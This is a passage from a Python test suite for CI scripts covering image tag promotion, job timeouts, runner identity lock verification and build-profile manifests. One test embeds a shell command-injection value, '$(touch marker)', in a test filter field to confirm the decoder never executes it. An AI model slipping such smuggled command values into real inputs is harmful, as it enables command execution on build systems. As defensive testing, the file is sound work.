                created_tag_groups(repeated_calls),
                [[f"{image_repository}:{flat_outputs['branch_tag']}"]],
            )
            self.assertIn("--prefer-index=false", repeated_calls)

            promotion_source = (SCRIPTS / "ci_image_promote.sh").read_text(
                encoding="utf-8"
            )
            self.assertNotIn("gh attestation", promotion_source)
            self.assertNotIn("docker build ", promotion_source)

            invalid_branches = ("", "CI/.hidden", "CI/foo.", "CI/foo.lock")
            for index, branch in enumerate(invalid_branches):
                run_command(
                    "git",
                    "check-ref-format",
                    f"refs/heads/{branch}",
                    expect_success=False,
                )
                rejected, _, calls, inspected = invoke(
                    branch, f"invalid-branch-{index}", expect_success=False
                )
                self.assertIn("canonical CI/** branch", rejected.stderr)
                self.assertEqual(calls, "")
                self.assertEqual(inspected, [])

            rejected_event, _, calls, inspected = invoke(
                "main",
                "pull-request-target",
                event_name="pull_request_target",
                expect_success=False,
            )
            self.assertIn("Only a trusted push", rejected_event.stderr)
            self.assertEqual(calls, "")
            self.assertEqual(inspected, [])

            mismatched_source, _, calls, inspected = invoke(
                "main",
                "source-mismatch",
                source_commit=COMMIT_B,
                expect_success=False,
            )
            self.assertIn("candidate/source commits", mismatched_source.stderr)
            self.assertEqual(calls, "")
            self.assertEqual(inspected, [])

            wrong_metadata, _, calls, inspected = invoke(
                "main",
                "wrong-metadata",
                expect_success=False,
                environment_overrides={
                    "CI_TEST_METADATA_DIGEST": base_environment[
                        "CI_TEST_WRONG_DIGEST"
                    ]
                },
            )
            self.assertIn("Mutable promotion metadata differs", wrong_metadata.stderr)
            self.assertIn("buildx imagetools create", calls)
            self.assertEqual(
                inspected, [f"{image_repository}:sha-{commit_a}"]
            )

            branch_destination = f"{image_repository}:branch-main"
            sha_destination_a = f"{image_repository}:sha-{commit_a}"

            immutable_state = registry_state()
            digest_conflict, _, calls, inspected = invoke(
                "CI/a-b",
                "same-commit-cross-ref-different-digest",
                image_digest=base_environment["CI_TEST_WRONG_DIGEST"],
                expect_success=False,
            )
            self.assertIn(
                "Immutable SHA tag already resolves to a different digest",
                digest_conflict.stderr,
            )
            self.assertEqual(inspected, [sha_destination_a])
            self.assertNotIn("buildx imagetools create", calls)
            self.assertEqual(registry_state(), immutable_state)

            immutable_preflight_failures = (
                ("no-digest", "inspected manifest lacks"),
                ("multiple", "duplicate JSON member: digest"),
                ("auth", "without one exact not-found result"),
                ("network", "without one exact not-found result"),
                ("not-found-drift", "without one exact not-found result"),
                ("unknown", "without one exact not-found result"),
            )
            for mode, diagnostic in immutable_preflight_failures:
                with self.subTest(immutable_sha_inspect=mode):
                    state_before = registry_state()
                    failed, _, calls, inspected = invoke(
                        "main",
                        f"immutable-preflight-{mode}",
                        expect_success=False,
                        environment_overrides={
                            "CI_TEST_INSPECT_MODE": mode,
                            "CI_TEST_INSPECT_TARGET": sha_destination_a,
                        },
                    )
                    self.assertIn(diagnostic, failed.stderr)
                    self.assertEqual(inspected, [sha_destination_a])
                    self.assertNotIn("buildx imagetools create", calls)
                    self.assertEqual(registry_state(), state_before)

            mutable_inspect_failures = (
                (
                    "wrong",
                    branch_destination,
                    [sha_destination_a, branch_destination],
                    "does not resolve to the tested digest",
                ),
                (
                    "missing",
                    latest_destination,
                    [sha_destination_a, branch_destination, latest_destination],
                    "could not be inspected",
                ),
                (
                    "multiple",
                    branch_destination,
                    [sha_destination_a, branch_destination],
                    "duplicate JSON member: digest",
                ),
            )
            for mode, target, expected_inspected, diagnostic in (
                mutable_inspect_failures
            ):
                failed, _, calls, inspected = invoke(
                    "main",
                    f"mutable-inspect-{mode}",
                    expect_success=False,
                    environment_overrides={
                        "CI_TEST_INSPECT_MODE": mode,
                        "CI_TEST_INSPECT_TARGET": target,
                    },
                )
                self.assertIn(diagnostic, failed.stderr)
                self.assertEqual(inspected, expected_inspected)
                self.assertEqual(inspected.count(target), 1)
                self.assertEqual(
                    calls.count("buildx imagetools inspect"), len(inspected)
                )

            run_local("git", "checkout", "--detach", commit_a, cwd=repository)
            dockerignore = repository / ".dockerignore"
            dockerignore.write_text(
                dockerignore.read_text(encoding="utf-8")
                + "\n# promotion freshness identity B\n",
                encoding="utf-8",
            )
            run_local("git", "add", ".dockerignore", cwd=repository)
            run_local(
                "git", "commit", "-m", "fixture: image identity B", cwd=repository
            )
            commit_b = run_local(
                "git", "rev-parse", "HEAD^{commit}", cwd=repository
            ).stdout.strip()
            manifest_b = manifest_for(commit_b, "identity-b")
            image_digest_b = "sha256:" + "8" * 64
            update_remote("main", commit_b)

            _, outputs_b, _, _ = invoke(
                "main",
                "main-b-after-a",
                candidate_commit=commit_b,
                manifest_digest=manifest_b,
                image_digest=image_digest_b,
            )
            self.assertIsNotNone(outputs_b)
            self.assertEqual(outputs_b["status"], "promoted")
            state = registry_state()
            self.assertEqual(state[branch_destination], image_digest_b)
            self.assertEqual(state[latest_destination], image_digest_b)
            self.assertEqual(
                state[f"{image_repository}:sha-{commit_b}"], image_digest_b
            )

            _, stale_a, _, stale_inspected = invoke(
                "main", "main-a-after-b"
            )
            self.assertIsNotNone(stale_a)
            self.assertEqual(stale_a["status"], "superseded")
            self.assertEqual(stale_inspected, [sha_destination_a])
            state = registry_state()
            self.assertEqual(state[branch_destination], image_digest_b)
            self.assertEqual(state[latest_destination], image_digest_b)
            self.assertEqual(state[sha_destination_a], IMAGE_DIGEST)

            manifest_mismatch, _, calls, inspected = invoke(
                "CI/a-b",
                "candidate-manifest-mismatch",
                manifest_digest="0" * 64,
                expect_success=False,
            )
            self.assertIn(
                "manifest differs for the candidate source commit",
                manifest_mismatch.stderr,
            )
            self.assertEqual(calls, "")
            self.assertEqual(inspected, [])

            update_remote("CI/pending-new-image", commit_b)
            _, pending_a, _, pending_inspected = invoke(
                "CI/pending-new-image", "pending-new-image-a"
            )
            self.assertIsNotNone(pending_a)
            self.assertEqual(pending_a["status"], "superseded")
            self.assertEqual(pending_inspected, [sha_destination_a])
            pending_destination = (
                f"{image_repository}:{pending_a['branch_tag']}"
            )
            self.assertNotIn(pending_destination, registry_state())

            run_local("git", "checkout", "--detach", commit_a, cwd=repository)
            (repository / "docs-only-note.md").write_text(
                "documentation-only branch advance\n", encoding="utf-8"
            )
            run_local("git", "add", "docs-only-note.md", cwd=repository)
            run_local(
                "git", "commit", "-m", "docs: advance without image input", cwd=repository
            )
            docs_commit = run_local(
                "git", "rev-parse", "HEAD^{commit}", cwd=repository
            ).stdout.strip()
            update_remote("CI/docs-only", docs_commit)
            _, docs_outputs, _, _ = invoke("CI/docs-only", "docs-only-a")
            self.assertIsNotNone(docs_outputs)
            self.assertEqual(docs_outputs["status"], "promoted")
            self.assertEqual(
                registry_state()[
                    f"{image_repository}:{docs_outputs['branch_tag']}"
                ],
                IMAGE_DIGEST,
            )

            empty_tree = run_local(
                "git", "mktree", cwd=repository, input_text=""
            ).stdout.strip()
            unrelated_commit = run_local(
                "git",
                "commit-tree",
                empty_tree,
                "-m",
                "unrelated force-push tip",
                cwd=repository,
            ).stdout.strip()
            update_remote("CI/force-push", unrelated_commit)
            force_failed, _, calls, inspected = invoke(
                "CI/force-push", "force-push-a", expect_success=False
            )
            self.assertIn("not an ancestor", force_failed.stderr)
            self.assertEqual(calls, "")
            self.assertEqual(inspected, [])

            run_local("git", "checkout", "--detach", commit_a, cwd=repository)
            (repository / ".dockerignore").unlink()
            run_local("git", "add", "--all", cwd=repository)
            run_local(
                "git", "commit", "-m", "fixture: missing image input", cwd=repository
            )
            missing_input_commit = run_local(
                "git", "rev-parse", "HEAD^{commit}", cwd=repository
            ).stdout.strip()
            update_remote("CI/missing-input", missing_input_commit)
            manifest_failed, _, calls, inspected = invoke(
                "CI/missing-input", "missing-input-a", expect_success=False
            )
            self.assertIn(
                "cannot measure canonical image input", manifest_failed.stderr
            )
            self.assertEqual(calls, "")
            self.assertEqual(inspected, [])

            update_remote("CI/ref-drift", commit_a)
            drift_failed, _, calls, inspected = invoke(
                "CI/ref-drift",
                "ref-drift-a",
                expect_success=False,
                environment_overrides={
                    "CI_TEST_GIT_DRIFT_COUNTER": str(root / "drift-fetch-count"),
                    "CI_TEST_GIT_DRIFT_NEXT": commit_b,
                    "CI_TEST_GIT_DRIFT_REF": "refs/heads/CI/ref-drift",
                    "CI_TEST_GIT_DRIFT_REPOSITORY": str(origin),
                },
            )
            self.assertIn("changed during promotion freshness", drift_failed.stderr)
            self.assertEqual(calls, "")
            self.assertEqual(inspected, [])


class CommandTimeoutContractTest(unittest.TestCase):
    """Exercise the portable total-deadline primitive used by fuzz profiles."""

    def test_deadline_terminates_a_real_process_group(self) -> None:
        """Return 124 promptly when a live child exceeds its declared bound."""
        started = time.monotonic()
        failed = run_command(
            sys.executable, SCRIPTS / "ci_command_timeout.py",
            "--timeout-seconds", "1",
            "--label", "fuzz-contract-test",
            "--", sys.executable, "-c", "import time; time.sleep(30)",
            expect_success=False,
        )
        elapsed = time.monotonic() - started
        self.assertEqual(failed.returncode, 124)
        self.assertLess(elapsed, 8)
        self.assertIn("exceeded its declared 1-second job timeout", failed.stderr)

    def test_fuzz_runner_wraps_configure_build_and_keeps_input_timeout(self) -> None:
        """Bind the matrix job bound before work while retaining libFuzzer timeout."""
        runner = (SCRIPTS / "fuzz_smoke.sh").read_text(encoding="utf-8")
        wrapper = runner.index('exec python3 "$SCRIPT_DIR/ci_command_timeout.py"')
        self.assertLess(wrapper, runner.index("run_logged configure_fuzz_codecs"))
        self.assertIn('--timeout-minutes "$job_timeout_minutes"', runner)
        self.assertIn('-- bash "$SCRIPT_DIR/fuzz_smoke.sh" --bounded-worker', runner)
        self.assertIn('"-timeout=$timeout"', runner)


class RunnerIdentityContractTest(unittest.TestCase):
    """Exercise finite rollout locks and one-shot retained runtime resolution."""

    @staticmethod
    def _module(name: str) -> object:
        """Load the production verifier under one test-unique module name."""
        module_path = SCRIPTS / "ci_runner_verify.py"
        specification = importlib.util.spec_from_file_location(name, module_path)
        if specification is None or specification.loader is None:
            raise AssertionError("ci_runner_verify.py cannot be loaded")
        module = importlib.util.module_from_spec(specification)
        specification.loader.exec_module(module)
        return module

    def test_linux_stable_and_rollout_hosts_resolve_once(self) -> None:
        """Accept both reviewed Linux versions and read each environment key once."""
        module = self._module("ci_runner_verify_linux_rollout_test")

        class CountingEnvironment(dict[str, str]):
            """Count exact environment reads made by the production verifier."""

            def __init__(self, values: dict[str, str]) -> None:
                super().__init__(values)
                self.reads: dict[str, int] = {}

            def get(self, key: str, default: str = "") -> str:
                self.reads[key] = self.reads.get(key, 0) + 1
                return super().get(key, default)

        for version in (LINUX_STABLE_VERSION, LINUX_ROLLOUT_VERSION):
            with self.subTest(version=version):
                environment = CountingEnvironment(
                    {"ImageOS": "ubuntu24", "ImageVersion": version}
                )
                with (
                    mock.patch.object(module.platform, "system", return_value="Linux"),
                    mock.patch.object(module.platform, "machine", return_value="x86_64"),
                    mock.patch.object(module.os, "environ", environment),
                ):
                    verified = module.verify(REPO_ROOT, "Linux", "ubuntu-24.04")
                self.assertEqual(verified["image_version"], version)
                self.assertEqual(environment.reads, {"ImageOS": 1, "ImageVersion": 1})

    def test_cli_retains_one_lock_snapshot_across_path_replacement(self) -> None:
        """Bind Linux and Darwin CLI output to one initially opened lock.

        Returns:
            None after both platform CLIs read once and emit the first lock's
            uniquely resolved identity despite deterministic pathname swap.

        Raises:
            AssertionError: The lock reopens, replacement changes selection, or
                file/stdout output diverges from the retained first object.

        Note:
            The replacement is another canonical lock that excludes the actual
            version, so a hidden second read deterministically fails the case.
        """
        module = self._module("ci_runner_verify_single_lock_snapshot_test")
        cases = (
            (
                "Linux",
                "linux-runner-lock.json",
                "x86_64",
                "ubuntu24",
                LINUX_STABLE_VERSION,
                "ubuntu-24.04",
            ),
            (
                "Darwin",
                "darwin-runner-lock.json",
                "arm64",
                "macos15",
                DARWIN_STABLE_VERSION,
                "macos-15",
            ),
        )
        for (
            platform_name,
            lock_name,
            machine,
            image_os,
            image_version,
            runner_label,
        ) in cases:
            with self.subTest(platform=platform_name), tempfile.TemporaryDirectory() as text:
                root = Path(text)
                lock_dir = root / "ci/locks"
                lock_dir.mkdir(parents=True)
                lock_path = lock_dir / lock_name
                original_path = REPO_ROOT / "ci/locks" / lock_name
                original = json.loads(original_path.read_text(encoding="utf-8"))
                lock_path.write_text(
                    json.dumps(original, sort_keys=True, indent=2) + "\n",
                    encoding="utf-8",
                )
                expected = module.resolve_approved_identity_from_lock(
                    original, platform_name, image_version
                )
                replacement = json.loads(json.dumps(original))
                if platform_name == "Linux":
                    replacement["approved_image_versions"] = [
                        "20990101.001.1"
                    ]
                else:
                    replacement["approved_images"] = [
                        {
                            "image_version": "20990101.001.1",
                            "vcpkg_commit": "f" * 40,
                        }
                    ]
                replacement_path = root / f"replacement-{lock_name}"
                replacement_path.write_text(
                    json.dumps(replacement, sort_keys=True, indent=2) + "\n",
                    encoding="utf-8",
                )
                real_reader = module._read_regular_bytes
                lock_reads = 0
                resolved_lock_path = lock_path.resolve()

                def replace_after_first_read(path: Path) -> bytes:
                    """Replace the pathname after returning its first bytes."""
                    nonlocal lock_reads
                    content = real_reader(path)
                    if Path(path).resolve() == resolved_lock_path:
                        lock_reads += 1
                        if lock_reads == 1:
                            os.replace(replacement_path, lock_path)
                    return content

                class CapturedStdout:
                    """Expose only the binary buffer used by production main."""

                    def __init__(self) -> None:
                        self.buffer = io.BytesIO()

                output = root / "retained-runner.json"
                captured = CapturedStdout()
                with (
                    mock.patch.object(
                        module, "_read_regular_bytes", replace_after_first_read
                    ),
                    mock.patch.object(
                        module.platform, "system", return_value=platform_name
                    ),
                    mock.patch.object(
                        module.platform, "machine", return_value=machine
                    ),
                    mock.patch.dict(
                        module.os.environ,
                        {"ImageOS": image_os, "ImageVersion": image_version},
                        clear=False,
                    ),
                    mock.patch.object(
                        module.sys,
                        "argv",
                        [
                            "ci_runner_verify.py",
                            "--repo-root",
                            str(root),
                            "--platform",
                            platform_name,
                            "--runner-label",
                            runner_label,
                            "--output",
                            str(output),
                        ],
                    ),
                    mock.patch.object(module.sys, "stdout", captured),
                ):
                    self.assertEqual(module.main(), 0)
                expected_bytes = module.canonical_identity_bytes(expected)
                self.assertEqual(lock_reads, 1)
                self.assertEqual(output.read_bytes(), expected_bytes)
                self.assertEqual(captured.buffer.getvalue(), expected_bytes)

    def test_linux_runtime_and_unknown_version_fail_closed(self) -> None:
        """Reject unknown version, OS, architecture, platform, and runner label."""
        module = self._module("ci_runner_verify_linux_negative_test")
        cases = (
            ("Linux", "x86_64", "ubuntu24", "unapproved", "ubuntu-24.04"),
            ("Linux", "x86_64", "ubuntu22", LINUX_STABLE_VERSION, "ubuntu-24.04"),
            ("Linux", "arm64", "ubuntu24", LINUX_STABLE_VERSION, "ubuntu-24.04"),
            ("Darwin", "x86_64", "ubuntu24", LINUX_STABLE_VERSION, "ubuntu-24.04"),
            ("Linux", "x86_64", "ubuntu24", LINUX_STABLE_VERSION, "ubuntu-latest"),
        )
        for system, machine, image_os, version, label in cases:
            with self.subTest(system=system, machine=machine, version=version, label=label):
                with (
                    mock.patch.object(module.platform, "system", return_value=system),
                    mock.patch.object(module.platform, "machine", return_value=machine),
                    mock.patch.dict(
                        module.os.environ,
                        {"ImageOS": image_os, "ImageVersion": version},
                        clear=False,
                    ),
                    self.assertRaises(module.RunnerError),
                ):
                    module.verify(REPO_ROOT, "Linux", label)

    def test_darwin_versions_map_to_unique_vcpkg_commits(self) -> None:
        """Resolve both arm64 rollout members and reject cross-bound records."""
        module = self._module("ci_runner_verify_darwin_rollout_test")
        expected = {
            DARWIN_STABLE_VERSION: "6d9d7df564a1ccdaa994e4ad39ccd4a32360867b",
            DARWIN_ROLLOUT_VERSION: "127402f1c75bb3d5ff6bce04b285faa4930a5aca",
        }
        for version, commit in expected.items():
            with self.subTest(version=version):
                with (
                    mock.patch.object(module.platform, "system", return_value="Darwin"),
                    mock.patch.object(module.platform, "machine", return_value="arm64"),
                    mock.patch.dict(
                        module.os.environ,
                        {"ImageOS": "macos15", "ImageVersion": version},
                        clear=False,
                    ),
                ):
                    verified = module.verify(REPO_ROOT, "Darwin", "macos-15")
                self.assertEqual(verified["triplet"], "arm64-osx")
                self.assertEqual(verified["vcpkg_commit"], commit)
                self.assertEqual(
                    verified["cmake_path"],
                    "/Users/runner/Library/Android/sdk/cmake/3.31.5/bin/cmake",
                )
                self.assertEqual(verified["cmake_version"], "3.31.5")
                self.assertEqual(
                    verified["cmake_gtest_module_sha256"],
                    "b5a2546c8cea1d5f9a366c6983261c621c0b34a40d8494caefdc0fa4c78862c4",
                )
                self.assertEqual(
                    verified["fuzz_c_compiler_path"],
                    "/opt/homebrew/opt/llvm@18/bin/clang",
                )
                self.assertEqual(
                    verified["fuzz_cxx_compiler_path"],
                    "/opt/homebrew/opt/llvm@18/bin/clang++",
                )
                self.assertEqual(verified["fuzz_compiler_version"], "18.1.8")
                forged = dict(verified)
                forged["vcpkg_commit"] = next(
                    value for value in expected.values() if value != commit
                )
                with self.assertRaises(module.RunnerError):
                    module.validate_resolved_identity(REPO_ROOT, "Darwin", forged)

        stable = module.resolve_approved_identity(
            REPO_ROOT, "Darwin", DARWIN_STABLE_VERSION
        )
        for field, forged_value in (
            ("image_os", "macos14"),
            ("architecture", "x86_64"),
            ("runner_label", "macos-latest"),
            ("triplet", "x64-osx"),
        ):
            with self.subTest(forged_field=field):
                forged = dict(stable)
                forged[field] = forged_value
                with self.assertRaises(module.RunnerError):
                    module.validate_resolved_identity(REPO_ROOT, "Darwin", forged)

        runtime_cases = (
            ("Darwin", "arm64", "macos14", "macos-15"),
            ("Darwin", "x86_64", "macos15", "macos-15"),
            ("Darwin", "arm64", "macos15", "macos-latest"),
        )
        for system, machine, image_os, label in runtime_cases:
            with self.subTest(runtime_field=(system, machine, image_os, label)):
                with (
                    mock.patch.object(module.platform, "system", return_value=system),
                    mock.patch.object(module.platform, "machine", return_value=machine),
                    mock.patch.dict(
                        module.os.environ,
                        {"ImageOS": image_os, "ImageVersion": DARWIN_STABLE_VERSION},
                        clear=False,
                    ),
                    self.assertRaises(module.RunnerError),
                ):
                    module.verify(REPO_ROOT, "Darwin", label)

    def test_rollout_lock_schema_order_and_uniqueness_fail_closed(self) -> None:
        """Reject empty, unsorted, duplicate, unknown-field, and noncanonical locks."""
        module = self._module("ci_runner_verify_lock_shape_test")
        sources = {
            "Linux": REPO_ROOT / "ci/locks/linux-runner-lock.json",
            "Darwin": REPO_ROOT / "ci/locks/darwin-runner-lock.json",
        }
        for platform_name, source in sources.items():
            original = json.loads(source.read_text(encoding="utf-8"))
            variants: list[tuple[str, dict[str, object], bool]] = []
            empty = json.loads(json.dumps(original))
            key = "approved_image_versions" if platform_name == "Linux" else "approved_images"
            empty[key] = []
            variants.append(("empty", empty, True))
            duplicate = json.loads(json.dumps(original))
            duplicate[key] = [duplicate[key][0], duplicate[key][0]]
            variants.append(("duplicate", duplicate, True))
            unsorted = json.loads(json.dumps(original))
            unsorted[key] = list(reversed(unsorted[key]))
            variants.append(("unsorted", unsorted, True))
            unknown = json.loads(json.dumps(original))
            unknown["unknown"] = "field"
            variants.append(("unknown-field", unknown, True))
            variants.append(("noncanonical-bytes", original, False))
            for label, value, canonical in variants:
                with self.subTest(platform=platform_name, mutation=label), tempfile.TemporaryDirectory() as text:
                    root = Path(text)
                    lock_path = root / (
                        "ci/locks/linux-runner-lock.json"
                        if platform_name == "Linux"
                        else "ci/locks/darwin-runner-lock.json"
                    )
                    lock_path.parent.mkdir(parents=True)
                    if canonical:
                        lock_path.write_text(
                            json.dumps(value, sort_keys=True, indent=2) + "\n",
                            encoding="utf-8",
                        )
                    else:
                        lock_path.write_text(
                            json.dumps(value, sort_keys=False, separators=(",", ":"))
                            + "\n",
                            encoding="utf-8",
                        )
                    with self.assertRaises(module.RunnerError):
                        module.load_runner_lock(root, platform_name)

    def test_runner_identity_safe_open_is_bounded_and_residual_safe(self) -> None:
        """Reject aliases, specials, missing flags, and residual output safely."""
        module = self._module("ci_runner_verify_safe_open_test")
        with tempfile.TemporaryDirectory() as temporary_text:
            root = Path(temporary_text)
            ordinary = root / "ordinary.json"
            content = b'{"identity":"ordinary"}\n'
            ordinary.write_bytes(content)
            self.assertEqual(module._read_regular_bytes(ordinary), content)

            symlink = root / "identity-link.json"
            symlink.symlink_to(ordinary)
            with self.assertRaises(module.RunnerError):
                module._read_regular_bytes(symlink)

            bounded_reader = (
                "import importlib.util,sys\n"
                "from pathlib import Path\n"
                f"p=Path({str(SCRIPTS / 'ci_runner_verify.py')!r})\n"
                "s=importlib.util.spec_from_file_location('bounded_runner_reader',p)\n"
                "m=importlib.util.module_from_spec(s); s.loader.exec_module(m)\n"
                "try:\n"
                " m._read_regular_bytes(Path(sys.argv[1]))\n"
                "except m.RunnerError:\n"
                " raise SystemExit(0)\n"
                "raise SystemExit(9)\n"
            )
            fifo = root / "identity.fifo"
            os.mkfifo(fifo)
            for special in (fifo, Path("/dev/null")):
                with self.subTest(special=special):
                    started = time.monotonic()
                    completed = subprocess.run(
                        [sys.executable, "-c", bounded_reader, str(special)],
                        cwd=REPO_ROOT,
                        text=True,
                        capture_output=True,
                        check=False,
                        timeout=3,
                    )
                    self.assertEqual(completed.returncode, 0, msg=completed.stderr)
                    self.assertLess(time.monotonic() - started, 3)

            for flag_name in ("O_NOFOLLOW", "O_NONBLOCK", "O_CLOEXEC"):
                with self.subTest(missing_input_flag=flag_name), mock.patch.object(
                    module.os, flag_name, None
                ), self.assertRaises(module.RunnerError):
                    module._read_regular_bytes(ordinary)

            identity = module.resolve_approved_identity(
                REPO_ROOT, "Linux", LINUX_STABLE_VERSION
            )
            retained = root / "retained.json"
            module._write_new_identity(retained, identity)
            self.assertEqual(
                module.load_resolved_identity(retained, REPO_ROOT, "Linux"),
                identity,
            )
            with self.assertRaises(module.RunnerError):
                module._write_new_identity(retained, identity)
            residual_target = root / "residual-target.json"
            residual_target.write_text("residual\n", encoding="utf-8")
            residual_link = root / "residual-output.json"
            residual_link.symlink_to(residual_target)
            with self.assertRaises(module.RunnerError):
                module._write_new_identity(residual_link, identity)
            for flag_name in ("O_NOFOLLOW", "O_CLOEXEC"):
                with self.subTest(missing_output_flag=flag_name), mock.patch.object(
                    module.os, flag_name, None
                ), self.assertRaises(module.RunnerError):
                    module._write_new_identity(
                        root / f"missing-{flag_name}.json", identity
                    )


class ProfileReaderContractTest(unittest.TestCase):
    """Exercise exact fallback, complete versioned input, and partial rejection."""

    @staticmethod
    def _write_complete_versioned_identity(inventory: Path) -> str:
        """Write one canonical complete versioned security identity fixture.

        Args:
            inventory: Existing directory that will receive all three identity
                files.

        Returns:
            The SHA-256 digest binding the matrix and security-role records.
        """
        matrix_records = {
            ("capability", "address-sanitizer"): {
                "default": False,
                "dependencies": [],
                "option": "USE_ASAN",
                "platforms": ["Darwin", "Linux"],
            },
            ("capability", "build-fuzzers"): {
                "default": False,
                "dependencies": [],
                "option": "PHOTOSPIDER_BUILD_FUZZERS",
                "platforms": ["Darwin", "Linux"],
            },
            ("capability", "build-testing"): {
                "default": True,
                "dependencies": [],
                "option": "BUILD_TESTING",
                "platforms": ["Darwin", "Linux"],
            },
            ("capability", "thread-sanitizer"): {
                "default": False,
                "dependencies": [],
                "option": "USE_TSAN",
                "platforms": ["Darwin", "Linux"],
            },
            ("component", "security-validation"): {
                "dependencies": ["openssl", "utf8proc"],
                "targets": ["fuzz_codec", "test_contract"],
            },
            ("dependency", "openssl"): {
                "cmake_package": "OpenSSL",
                "lock": "ci/locks/requirements-ci.txt",
                "mode": "required",
                "vcpkg_port": "openssl",
            },
            ("dependency", "utf8proc"): {
                "cmake_package": "utf8proc",
                "lock": "ci/locks/requirements-ci.txt",
                "mode": "required",
                "vcpkg_port": "utf8proc",
            },
            ("profile", "fuzz-codecs"): {
                "cmake_args": [
                    "-DBUILD_TESTING=OFF",
                    "-DPHOTOSPIDER_BUILD_FUZZERS=ON",
                    "-DUSE_ASAN=OFF",
                    "-DUSE_TSAN=OFF",
                ],
                "components": ["security-validation"],
                "dependencies": ["openssl", "utf8proc"],
                "platforms": ["Darwin", "Linux"],
                "roles": ["fuzz-artifact", "fuzz-codec"],
            },
            ("profile", "sanitizer-asan"): {
                "cmake_args": [
                    "-DBUILD_TESTING=ON",
                    "-DPHOTOSPIDER_BUILD_FUZZERS=OFF",
                    "-DUSE_ASAN=ON",
                    "-DUSE_TSAN=OFF",
                ],
                "components": ["security-validation"],
                "dependencies": ["openssl", "utf8proc"],
                "platforms": ["Darwin", "Linux"],
                "roles": ["sanitizer-artifact", "sanitizer-target", "security-label"],
            },
            ("profile", "sanitizer-tsan"): {
                "cmake_args": [
                    "-DBUILD_TESTING=ON",
                    "-DPHOTOSPIDER_BUILD_FUZZERS=OFF",
                    "-DUSE_ASAN=OFF",
                    "-DUSE_TSAN=ON",
                ],
                "components": ["security-validation"],
                "dependencies": ["openssl", "utf8proc"],
                "platforms": ["Darwin", "Linux"],
                "roles": ["sanitizer-artifact", "sanitizer-target", "security-label"],
            },
            ("role", "fuzz-artifact"): {"kind": "artifact", "selector": "fuzz-smoke"},
            ("role", "fuzz-codec"): {
                "corpus_sha256": None,
                "job_timeout_minutes": 20,
                "kind": "fuzz-target",
                "max_len": 65536,
                "production_limit": 65536,
                "production_limit_symbol": "ps::codec::kLimit",
                "runs": 1000,
                "seed": 1,
                "selector": "fuzz_codec",
                "timeout_seconds": 2,
            },
            ("role", "sanitizer-artifact"): {
                "kind": "artifact",
                "selector": "sanitizer-smoke",
            },
            ("role", "sanitizer-target"): {"kind": "target", "selector": "test_contract"},
            ("role", "security-label"): {"kind": "ctest-label", "selector": "security"},
            ("target", "fuzz_codec"): {
                "capabilities": ["build-fuzzers"],
                "component": "security-validation",
            },
            ("target", "test_contract"): {
                "capabilities": ["build-testing"],
                "component": "security-validation",
            },
        }
        encoded_records = [
            f"{kind}\t{identifier}\t"
            + json.dumps(value, sort_keys=True, separators=(",", ":"), ensure_ascii=True)
            for (kind, identifier), value in matrix_records.items()
        ]
        matrix = inventory / "build_profile_matrix_v1.tsv"
        matrix.write_text(
            "schema\tphotospider-build-profile-matrix-v1\n"
            + "\n".join(sorted(encoded_records))
            + "\n",
            encoding="utf-8",
        )
        digest = hashlib.sha256(matrix.read_bytes()).hexdigest()
        (inventory / "build_profile_matrix_v1.tsv.sha256").write_text(
            f"{digest}  build_profile_matrix_v1.tsv\n",
            encoding="utf-8",
        )
        records = [
            "fuzz\tfuzz-codecs\tfuzz-codec",
            "sanitizer\tsanitizer-asan\t[\"sanitizer-target\"]\t[\"security-label\"]",
            "sanitizer\tsanitizer-tsan\t[\"sanitizer-target\"]\t[\"security-label\"]",
        ]
        (inventory / "ci_security_roles_v1.tsv").write_text(
            "schema\tphotospider-ci-security-roles-v1\n"
            f"matrix_sha256\t{digest}\n"
            + "\n".join(sorted(records)) + "\n",
            encoding="utf-8",
        )
        return digest

    @staticmethod
    def _refresh_versioned_digest(inventory: Path) -> str:
        """Rebind sidecar and roles header after one deliberate matrix mutation."""
        matrix = inventory / "build_profile_matrix_v1.tsv"
        digest = hashlib.sha256(matrix.read_bytes()).hexdigest()
        (inventory / "build_profile_matrix_v1.tsv.sha256").write_text(
            f"{digest}  build_profile_matrix_v1.tsv\n", encoding="utf-8"
        )
        roles = inventory / "ci_security_roles_v1.tsv"
        lines = roles.read_text(encoding="utf-8").splitlines()
        lines[1] = f"matrix_sha256\t{digest}"
        roles.write_text("\n".join(lines) + "\n", encoding="utf-8")
        return digest

    def test_current_main_fallback_is_hash_bound(self) -> None:
        """Resolve current main only through the explicitly identified fallback."""
        completed = run_command(
            sys.executable, SCRIPTS / "ci_profile_manifest.py",
            "--profile", "fuzz-codecs",
        )
        resolved = json.loads(completed.stdout)
        self.assertTrue(resolved["fallback"])
        self.assertEqual(resolved["profile"]["seed"], 1)
        self.assertEqual(resolved["profile"]["runs"], 1000)
        self.assertEqual(
            [target["max_len"] for target in resolved["profile"]["targets"]],
            [65536, 131072],
        )

    def test_fallback_sanitizer_shell_preserves_empty_filters_and_trust(self) -> None:
        """Run the real fallback shell decoder without collapsing empty fields."""
        with tempfile.TemporaryDirectory() as temporary_text:
            root = Path(temporary_text) / "repository"
            scripts = root / "ci/scripts"
            locks = root / "ci/locks"
            shim = root / "test-shim"
            scripts.mkdir(parents=True)
            locks.mkdir(parents=True)
            shim.mkdir()
            for name in (
                "common.sh",
                "ci_profile_manifest.py",
                "ci_runner_verify.py",
                "sanitizer_test.sh",
                "security_platform_prepare.sh",
            ):
                shutil.copy2(SCRIPTS / name, scripts / name)
            lock_source = REPO_ROOT / "ci/locks/current-main-profiles-v1.json"
            lock = json.loads(lock_source.read_text(encoding="utf-8"))
            marker = root / "filter-must-not-execute"
            injected_filter = f"Execution.*;$(touch {marker})"
            lock["sanitizers"][0]["invocations"][0]["filter"] = injected_filter
            (locks / "current-main-profiles-v1.json").write_text(
                json.dumps(lock, indent=2, sort_keys=True) + "\n", encoding="utf-8"
            )
            shutil.copy2(
                REPO_ROOT / "ci/locks/linux-runner-lock.json",
                locks / "linux-runner-lock.json",
            )
            runner_identity_path = root / "linux-runner-identity.json"
            write_runner_identity(
                runner_identity_path, "Linux", LINUX_STABLE_VERSION
            )
            for relative in lock["source_hashes"]:
                destination = root / relative
                destination.parent.mkdir(parents=True, exist_ok=True)
                shutil.copy2(REPO_ROOT / relative, destination)

            fake_test = shim / "fake-gtest"
            fake_test.write_text(
                "#!/usr/bin/env bash\n"
                "set -Eeuo pipefail\n"
                "{\n"
                "  printf 'call\\0%s\\0' \"${0##*/}\"\n"
                "  for argument in \"$@\"; do printf '%s\\0' \"$argument\"; done\n"
                "  printf 'end\\0'\n"
